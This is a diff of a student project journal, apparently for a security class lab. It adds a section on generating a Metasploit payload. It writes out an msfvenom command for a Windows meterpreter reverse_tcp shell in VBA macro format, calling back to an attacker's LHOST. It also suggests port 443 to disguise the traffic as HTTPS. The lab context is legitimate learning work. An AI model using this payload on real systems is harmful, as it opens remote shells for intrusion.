@@ -10,7 +10,22 @@ Data (like text from Magic cards) is transformed into these vectors using a proc
 When you query, the same vectorization process is applied to your query, and the resulting query vector is compared to the vectors in the database to find the most similar ones.      
 Technologies used will include Weaviate(built in AI and machine learning integration), OpenAI, python, node.js and next.js    
 
-# Day One: I have no idea what I am doing!  
-The project I am trying to follow isn't very beginner friendly, so I am doing a lot of research via notebook LM and youtube videos to figure out a list of things.  
-- First I made a weaviate account and collected both the api key and the URL.
-- Next I got an API key from Open AP.
+# Day One: Topic 
+After adding Ben to the group a little later into the semester, I opened up the Idea to doing a project that was little more realistic for our group to complete. I really just used AI and the project prompt to get some suggestions. Ultimately went with the subject explained above. Also used AI to create an outline of each members responsibilities by giving it our topic, timeline and number of memebers.
+- Looking back, it was great for a start, but we should have revised it to be a little more compatible with our group.  
+
+# MSFVenom Payload  
+AI suggested using MSFVenom to create the payload and after looking into it, I realized that it was implemented in metasploite which we have experience with and acess to on our proxmox VMs. 
+This was the main website I used to research the flags and how to use them(reading the instruction in the terminal is a bit of a headache for me) https://www.offsec.com/metasploit-unleashed/msfvenom/  
+Ultimately the command I came up with was msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f vba.  
+- "windows" to target a windows machine(any of the promox machines in our case)  
+- "meterpreter" is the interactive shell component
+- "reverse_tcp" makes the victim reach out to our attacking machine
+* LHOST will be our attacking machines IP(kali linux proxmox vm)
+* LPORT will be the port we have our listener setup on
+- Can use 4444 which is the metasploit default
+- Another option is 443 if we want to be sneaky and make it look like HTTPS traffic  
+* -f VBA
+- f = format of the output
+- vba = visual basic for applications format
+
